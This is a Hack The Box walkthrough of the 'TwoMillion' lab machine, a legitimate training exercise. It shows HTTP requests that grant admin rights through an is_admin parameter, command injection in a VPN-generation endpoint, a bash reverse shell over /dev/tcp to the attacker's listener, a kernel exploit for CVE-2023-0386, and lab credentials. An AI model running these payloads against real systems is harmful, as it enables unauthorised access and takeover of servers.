## TwoMillion - Hack The Box Writeup

[Room Link](https://app.hackthebox.com/machines/547)

<i>TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. 
After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. 
With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. 
An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. 
The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell.</i>

**IP: 2million.htb**

**Replace [YOUR-HTB-IP] with your own machine IP assigned by Hack The Box.**

---

## 📌 General Information

**Room Difficulty**: Easy / Medium   <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Rustcan, Burp Suite<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png"/>](https://github.com/mauzware)

[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Since Nmap scan took forever, I did Rustscan for all ports then Nmap for found open ports.

  ```
  $ rustscan -a 10.10.11.221 -r 1-65535
  .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
  | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
  | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
  `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
  The Modern Day Port Scanner.
  ________________________________________
  : http://discord.skerritt.blog         :
  : https://github.com/RustScan/RustScan :
   --------------------------------------
  PORT   STATE SERVICE REASON
  22/tcp open  ssh     syn-ack ttl 63
  80/tcp open  http    syn-ack ttl 63

  $nmap -sC -sV -p 22,80 2million.htb

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
  |_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
  80/tcp open  http    nginx
  |_http-title: Hack The Box :: Penetration Testing Labs
  |_http-trane-info: Problem with XML parsing of /evox/about
  | http-cookie-flags: 
  |   /: 
  |     PHPSESSID: 
  |_      httponly flag not set
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```
  
- When you go to `/invite` page on the web app, you find this script in the source code.

  ```
  <!-- scripts -->
    <script src="/js/htb-frontend.min.js"></script>
    <script defer src="/js/inviteapi.min.js"></script>
    <script defer>
        $(document).ready(function() {
            $('#verifyForm').submit(function(e) {
                e.preventDefault();

                var code = $('#code').val();
                var formData = { "code": code };

                $.ajax({
                    type: "POST",
                    dataType: "json",
                    data: formData,
                    url: '/api/v1/invite/verify',
                    success: function(response) {
                        if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") {
                            // Store the invite code in localStorage
                            localStorage.setItem('inviteCode', code);

                            window.location.href = '/register';
                        } else {
                            alert("Invalid invite code. Please try again.");
                        }
                    },
                    error: function(response) {
                        alert("An error occurred. Please try again.");
                    }
                });
            });
        });
    </script>
  ```
  
- Take the `/js/inviteapi.min.js` script and put it in the beautifier in order to find `makeInviteCode` script which will create an invite code for you. We need it in order to login.

---

## 🌐 Web Exploitation

- Here, I ran `makeInviteCode(123)` in developer tools and got this:

  ```
  Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr
  ```
  
- It's a ROT13 so crack it.

  ```
  $ python3 ROTEncoder.py 

  Choose which ROT cipher, rot13/rot47 or type 'exit' to quit: rot13
  Enter text to encode/decode with ROT13: Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr
  ROT13 result: In order to generate the invite code, make a POST request to /api/v1/invite/generate
  ```
  
- Cool, we just have to send a POST request to `/api/v1/invite/generate` and we will get our code. You can use `curl` here or Burp, both options worked fine for me.

  ```
  http://2million.htb/api/v1/invite/generate -> Intercept -> Change GET to POST -> send the request

  code 200
  success	1
  data	
  code	"VzlLT1ItR01aV00tQkRMTUEtNTlRQUQ="
  format	"encoded"

  $ echo 'VzlLT1ItR01aV00tQkRMTUEtNTlRQUQ=' | base64 -d
  W9KOR-GMZWM-BDLMA-59QAD
  ```

- Now, use the code and create an account. When you visit VPN section, click on both `Connection Pack` and `Refresh` while Intercept is on so you can capture all available API's.

- So, instead of brute forcing all API's, I checked the `/api` first and then `/api/v1` in order to find them all.

  ```
  Request:

  GET /api HTTP/1.1
  Host: 2million.htb
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Connection: keep-alive
  Referer: http://2million.htb/home/access
  Cookie: PHPSESSID=um757ovsecv1vf5479od3lnb1v
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  
  Response:
  
  HTTP/1.1 200 OK
  Server: nginx
  Date: Wed, 11 Jun 2025 22:33:47 GMT
  Content-Type: application/json
  Connection: keep-alive
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Content-Length: 36
  
  {"\/api\/v1":"Version 1 of the API"}
  
  Request:
  
  GET /api/v1 HTTP/1.1
  Host: 2million.htb
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Connection: keep-alive
  Referer: http://2million.htb/home/access
  Cookie: PHPSESSID=um757ovsecv1vf5479od3lnb1v
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  
  Response:
  
  HTTP/1.1 200 OK
  Server: nginx
  Date: Wed, 11 Jun 2025 22:35:04 GMT
  Content-Type: application/json
  Connection: keep-alive
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Content-Length: 800
  
  
  {
    "v1": { 
      "user": {
        "GET": {
          "/api/v1": "Route List",  
          "/api/v1/invite/how/to/generate": "Instructions on invite code generation", 
          "/api/v1/invite/generate": "Generate invite code",
          "/api/v1/invite/verify": "Verify invite code",
          "/api/v1/user/auth": "Check if user is authenticated",
          "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
          "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
          "/api/v1/user/vpn/download": "Download OVPN file"
        },
        "POST": {
          "/api/v1/user/register": "Register a new user",
          "/api/v1/user/login": "Login with existing user"
        }
      },
      "admin": {
        "GET": {
          "/api/v1/admin/auth": "Check if user is admin"
        },
        "POST": {
          "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
        },
        "PUT": {
          "/api/v1/admin/settings/update": "Update user settings"
        }
      }
    }
  }
  ```

- Here, I checked `/auth` API in order to see if I'm admin or not.

  ```
  Request:

  GET /api/v1/admin/auth HTTP/1.1
  Host: 2million.htb
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Connection: keep-alive
  Referer: http://2million.htb/home/access
  Cookie: PHPSESSID=um757ovsecv1vf5479od3lnb1v
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  
  Response:
  
  HTTP/1.1 200 OK
  Server: nginx
  Date: Wed, 11 Jun 2025 22:40:20 GMT
  Content-Type: application/json
  Connection: keep-alive
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Content-Length: 17
  
  {"message":false}
  ```

- No admin for lil mauz... 😢

- So, I tried to update my profile:

  ```
  Request:

  PUT /api/v1/admin/settings/update HTTP/1.1
  Host: 2million.htb
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Connection: keep-alive
  Referer: http://2million.htb/home/access
  Cookie: PHPSESSID=um757ovsecv1vf5479od3lnb1v
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  
  Response:
  
  HTTP/1.1 200 OK
  Server: nginx
  Date: Wed, 11 Jun 2025 22:41:25 GMT
  Content-Type: application/json
  Connection: keep-alive
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Content-Length: 53
  
  {"status":"danger","message":"Invalid content type."}
  ```

- Nice, we can just add `Content-Type: application/json` here and explore more.

  ```
  Request:

  PUT /api/v1/admin/settings/update HTTP/1.1
  Host: 2million.htb
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Connection: keep-alive
  Referer: http://2million.htb/home/access
  Cookie: PHPSESSID=um757ovsecv1vf5479od3lnb1v
  Content-Type: application/json
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  
  Response:
  
  HTTP/1.1 200 OK
  Server: nginx
  Date: Wed, 11 Jun 2025 22:43:50 GMT
  Content-Type: application/json
  Connection: keep-alive
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Content-Length: 56
  
  {"status":"danger","message":"Missing parameter: email"}
  ```

- Keep digging until you become an admin. Remember to use username and email for the account you made after using the code earlier!

  ```
  Request:

  PUT /api/v1/admin/settings/update HTTP/1.1
  Host: 2million.htb
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Connection: keep-alive
  Referer: http://2million.htb/home/access
  Cookie: PHPSESSID=um757ovsecv1vf5479od3lnb1v
  Content-Type: application/json
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  Content-Length: 35
  
  {
  	"email":"bimbo@test.com"
  }
  
  Response:
  
  HTTP/1.1 200 OK
  Server: nginx
  Date: Wed, 11 Jun 2025 22:45:18 GMT
  Content-Type: application/json
  Connection: keep-alive
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Content-Length: 59
  
  {"status":"danger","message":"Missing parameter: is_admin"}
  ```

  ```
  Request:

  PUT /api/v1/admin/settings/update HTTP/1.1
  Host: 2million.htb
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Connection: keep-alive
  Referer: http://2million.htb/home/access
  Cookie: PHPSESSID=um757ovsecv1vf5479od3lnb1v
  Content-Type: application/json
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  Content-Length: 55
  
  {
  	"email":"bimbo@test.com",
  	"is_admin":"true"
  }
  
  Response:
  
  HTTP/1.1 200 OK
  Server: nginx
  Date: Wed, 11 Jun 2025 22:46:01 GMT
  Content-Type: application/json
  Connection: keep-alive
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Content-Length: 76
  
  {"status":"danger","message":"Variable is_admin needs to be either 0 or 1."}
  
  Request:
  
  PUT /api/v1/admin/settings/update HTTP/1.1
  Host: 2million.htb
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Connection: keep-alive
  Referer: http://2million.htb/home/access
  Cookie: PHPSESSID=um757ovsecv1vf5479od3lnb1v
  Content-Type: application/json
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  Content-Length: 50
  
  {
  	"email":"bimbo@test.com",
  	"is_admin":1
  }
  
  Response:
  
  HTTP/1.1 200 OK
  Server: nginx
  Date: Wed, 11 Jun 2025 22:46:37 GMT
  Content-Type: application/json
  Connection: keep-alive
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Content-Length: 41
  
  {"id":22,"username":"bimbo","is_admin":1}
  ```

- GOTEM COACH! I should be admin now, but let's confirm it real quick and move to gaining access.

  ```
  Request

  GET /api/v1/admin/auth HTTP/1.1
  Host: 2million.htb
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Connection: keep-alive
  Referer: http://2million.htb/home/access
  Cookie: PHPSESSID=um757ovsecv1vf5479od3lnb1v
  Content-Type: application/json
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  Content-Length: 50
  
  {
  	"email":"bimbo@test.com",
  	"is_admin":1
  }
  
  Response:
  
  HTTP/1.1 200 OK
  Server: nginx
  Date: Wed, 11 Jun 2025 22:47:49 GMT
  Content-Type: application/json
  Connection: keep-alive
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Content-Length: 16
  
  {"message":true}
  ```

---

## ⚙️ Shell Access

- Here, it took a bit to find a vulnerable endpoint for command injection. It's this one `/api/v1/admin/vpn/generate`.

- When I sent a request here, I got a response that it requires username.

  ```
  Request:

  POST /api/v1/admin/vpn/generate HTTP/1.1
  Host: 2million.htb
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Connection: keep-alive
  Referer: http://2million.htb/home/access
  Cookie: PHPSESSID=um757ovsecv1vf5479od3lnb1v
  Content-Type: application/json
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  Content-Length: 50
  
  {
  	"email":"bimbo@test.com",
  	"is_admin":1
  }
  
  Response:
  
  HTTP/1.1 200 OK
  Server: nginx
  Date: Wed, 11 Jun 2025 22:49:18 GMT
  Content-Type: text/html; charset=UTF-8
  Connection: keep-alive
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Content-Length: 59
  
  {"status":"danger","message":"Missing parameter: username"}
  ```
  
- Let's try it with username then:

  ```
  Request:

  POST /api/v1/admin/vpn/generate HTTP/1.1
  Host: 2million.htb
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Connection: keep-alive
  Referer: http://2million.htb/home/access
  Cookie: PHPSESSID=um757ovsecv1vf5479od3lnb1v
  Content-Type: application/json
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  Content-Length: 29
  
  {
  	"username":"bimbo"
  }
  
  Response:
  
  HTTP/1.1 200 OK
  Server: nginx
  Date: Wed, 11 Jun 2025 22:50:45 GMT
  Content-Type: text/html; charset=UTF-8
  Connection: keep-alive
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Content-Length: 10824
  
  client
  dev tun
  proto udp
  remote edge-eu-free-1.2million.htb 1337
  resolv-retry infinite
  nobind
  persist-key
  persist-tun
  remote-cert-tls server
  comp-lzo
  verb 3
  data-ciphers-fallback AES-128-CBC
  data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
  tls-cipher "DEFAULT:@SECLEVEL=0"
  auth SHA256
  key-direction 1
  [SNIP!]
  ```
  
- Here, the machine is probably using bash in order to generate VPN's, so I tried some shell commands and it worked!

  ```
  Request:

  POST /api/v1/admin/vpn/generate HTTP/1.1
  Host: 2million.htb
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Connection: keep-alive
  Referer: http://2million.htb/home/access
  Cookie: PHPSESSID=um757ovsecv1vf5479od3lnb1v
  Content-Type: application/json
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  Content-Length: 39
  
  {
  	"username":"bimbo; ls #"
  }
  
  Response:
  
  HTTP/1.1 200 OK
  Server: nginx
  Date: Wed, 11 Jun 2025 22:53:15 GMT
  Content-Type: text/html; charset=UTF-8
  Connection: keep-alive
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Content-Length: 83
  
  Database.php
  Router.php
  VPN
  assets
  controllers
  css
  fonts
  images
  index.php
  js
  views
  ```

- If this failed, we would have to use commands from different languages in order to catch the right one. Now start a listener, and send a bash reverse shell in order to gain access to the machine.

  ```
  Request:

  POST /api/v1/admin/vpn/generate HTTP/1.1
  Host: 2million.htb
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Connection: keep-alive
  Referer: http://2million.htb/home/access
  Cookie: PHPSESSID=um757ovsecv1vf5479od3lnb1v
  Content-Type: application/json
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  Content-Length: 35
  
  {
  	"username":"bimbo; bash -c 'exec bash -i >& /dev/tcp/[YOUR-HTB-IP]/4444 0>&1' #"
  }

  $ nc -lvnp 4444                     
  listening on [any] 4444 ...
  connect to [YOUR-HTB-IP] from (UNKNOWN) [10.10.11.221] 37232
  bash: cannot set terminal process group (1194): Inappropriate ioctl for device
  bash: no job control in this shell
  www-data@2million:~/html$ whoami
  whoami
  www-data
  www-data@2million:~/html$ id
  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

- LET'S FFFFFFFFFFFFFF GOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO!!!! This whole API exploitation process took more than 2 hours.

---

## 🧍 User Privilege Escalation

- We got a shell as `www-data` and we can find `admin` credentials immediately in that same directory.

  ```
  www-data@2million:~/html$ cat .env
  DB_HOST=127.0.0.1
  DB_DATABASE=htb_prod
  DB_USERNAME=admin
  DB_PASSWORD=SuperDuperPass123
  ```
  
- I'll keep saying this, NEVER REUSE PASSWORDS!!!!!

  ```
  www-data@2million:~$ cd /home
  www-data@2million:/home$ ls -al
  total 12
  drwxr-xr-x  3 root  root  4096 Jun  6  2023 .
  drwxr-xr-x 19 root  root  4096 Jun  6  2023 ..
  drwxr-xr-x  7 admin admin 4096 Jun 11 14:31 admin
  
  www-data@2million:/home$ cd admin
  www-data@2million:/home/admin$ ls -al
  total 48
  drwxr-xr-x 7 admin admin 4096 Jun 11 14:31 .
  drwxr-xr-x 3 root  root  4096 Jun  6  2023 ..
  lrwxrwxrwx 1 root  root     9 May 26  2023 .bash_history -> /dev/null
  -rw-r--r-- 1 admin admin  220 May 26  2023 .bash_logout
  -rw-r--r-- 1 admin admin 3771 May 26  2023 .bashrc
  drwx------ 2 admin admin 4096 Jun  6  2023 .cache
  drwx------ 3 admin admin 4096 Jun 11 13:47 .gnupg
  -rw------- 1 admin admin   20 Jun 11 13:37 .lesshst
  drwxrwxr-x 3 admin admin 4096 Jun 11 13:52 .local
  -rw-r--r-- 1 admin admin  807 May 26  2023 .profile
  drwx------ 2 admin admin 4096 Jun  6  2023 .ssh
  drwxrwxr-x 5 admin admin 4096 Jun 11 18:31 CVE-2023-0386
  -rw-r----- 1 root  admin   33 Jun 11 04:06 user.txt
  
  www-data@2million:/home/admin$ cat user.txt 
  cat: user.txt: Permission denied
  
  www-data@2million:/home/admin$ su admin
  Password: 
  To run a command as administrator (user "root"), use "sudo <command>".
  See "man sudo_root" for details.
  
  admin@2million:~$ cat user.txt 
  671055342b72befb98824cdbb4eca724
  ```
  
- Now login with SSH since it's more stable shell and move to root escalation.

---

## 👑 Root Privilege Escalation

- For gaining root access, we will exploit `CVE-2023-0386`. The exploit is already downloaded on target machine and you can find details on how to use it [here](https://github.com/sxlmnwb/CVE-2023-0386).

- Start another terminal and login as admin with SSH. On the first terminal we will make the exploit and compile it.

  ```
  admin@2million:~$ cd CVE-2023-0386/
  admin@2million:~/CVE-2023-0386$ make all
  gcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl
  /usr/bin/ld: /usr/lib/gcc/x86_64-linux-gnu/11/../../../x86_64-linux-gnu/libfuse.a(fuse.o): in function `fuse_new_common':
  (.text+0xaf4e): warning: Using 'dlopen' in statically linked applications requires at runtime the shared libraries from the glibc version used for linking
  gcc -o exp exp.c -lcap
  gcc -o gc getshell.c
  
  admin@2million:~/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc
  [+] len of gc: 0x3ee0
  mkdir: File exists
  ```
  
- On the second terminal we will just run the exploit from same directory that we compiled it and get root.

  ```
  admin@2million:~/CVE-2023-0386$ ./exp
  uid:1000 gid:1000
  [+] mount success
  total 8
  drwxrwxr-x 1 root   root     4096 Jun 11 23:15 .
  drwxrwxr-x 6 root   root     4096 Jun 11 23:13 ..
  -rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
  [+] exploit success!
  To run a command as administrator (user "root"), use "sudo <command>".
  See "man sudo_root" for details.
  
  root@2million:~/CVE-2023-0386# whoami
  root
  root@2million:~/CVE-2023-0386# id
  uid=0(root) gid=0(root) groups=0(root),1000(admin)
  ```
  
- Read the flag and it's done.

---

## 🏁 Flags

- **User Flag**: `671055342b72befb98824cdbb4eca724`
- **Root Flag**: `5e4509632224e72112cce1785967fd0e`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Getting my way around all of these API's.`

- What did I learn?
  `Honestly, this one felt more like a medium box than easy box. I'm so glad I did this one and learned a lot from it when it comes to web hacking!`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
